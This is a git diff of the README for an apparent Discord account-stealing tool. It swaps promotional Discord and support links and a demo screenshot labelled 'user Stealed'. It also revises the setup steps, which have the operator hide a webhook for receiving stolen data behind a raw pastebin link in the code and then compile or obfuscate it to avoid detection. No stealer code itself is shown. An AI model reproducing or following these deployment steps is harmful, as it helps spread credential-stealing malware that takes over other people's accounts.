@@ -1,6 +1,6 @@
 <p align='center'>
   <b>🐲 Follow me here 🐲</b><br>  
-  <a href="https://discord.gg/P6b8ZFee9A">Discord</a> |
+  <a href="https://discord.gg/AkCCYDydKC">Discord</a> |
   <a href="https://www.youtube.com/channel/UC-XII5SSqbMOF1UX3N0Gl8g">YouTube</a> |
   <a href="https://github.com/KanekiWeb">Github</a><br><br>
 </p>
@@ -16,9 +16,8 @@
     ```
 - #### 🖥️ Starting
       1 - Git clone the repo
-      2 - Put your webhook on pastebin
-      3 - Line 173 Replace "XXXXXXXX" by your pastebin link (with raw)
-      4 - Line 174 Replace by your custom status
+      2 - Upload your webhook on a pastebin
+      3 - Line 173 Replace `https://pastebin.com/raw/XXXXXXXX` by your pastebin link (with raw)
       5 - Compile or obfusque your code and enjoy
       
 ##  
@@ -36,13 +35,13 @@
 
 ### 📸 Demos
 - #### user Stealed
-    <img src="https://cdn.discordapp.com/attachments/916481725582966821/916484291003826246/AcH8fFGRSow1AAAAAElFTkSuQmCC.png">
+    <img src="https://media.discordapp.net/attachments/921472632283598898/924761259533025331/ByYOMeAVzDiVAAAAAElFTkSuQmCC.png?width=354&height=600">
 
 ##   
 
 ### 🧰 Support
 - Email: <kaneki_pro@protonmail.com>
-- Discord: https://discord.gg/P6b8ZFee9A
+- Discord: https://kanekiweb.tk/discord
 
 ##  
 
